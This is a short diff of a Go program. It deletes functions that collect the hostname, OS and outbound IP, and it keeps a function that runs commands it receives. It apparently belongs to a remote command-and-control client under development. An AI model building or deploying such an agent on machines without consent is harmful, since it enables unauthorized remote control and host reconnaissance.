@@ -16,36 +16,6 @@ import (
 
 )
 
-func getHostname() string{
-    name, err := os.Hostname()
-    if err != nil { 
-        panic(err)
-    }
-    return name
-}
-
-func getOS() string{ 
-	var os string
-	if runtime.GOOS == "windows" {
-		os = "Windows"
-	}else if runtime.GOOS == "linux" { 
-		os = "Linux"
-	}
-	return os
-
-}
-
-func GetOutboundIP() net.IP {
-    conn, err := net.Dial("udp", "8.8.8.8:80")
-    if err != nil {
-        log.Fatal(err)
-    }
-    defer conn.Close()
-
-    localAddr := conn.LocalAddr().(*net.UDPAddr)
-
-    return localAddr.IP
-}
 
 func execute(cmd string) { 
     out, err := exec.Command(cmd).Output()
@@ -79,10 +49,9 @@ func recieveCommand(path string) {
 
 func main() {
 	
-	
+    //for now, make key on client(change in revision)
     reqBody, err := json.Marshal(map[string]string{
-        "encryptedkey1": "encrypteddata1",
-		"encryptedkey2":    "encrypteddata2",
+        "key1": "keyvalue",
 		
     })
     if err != nil {
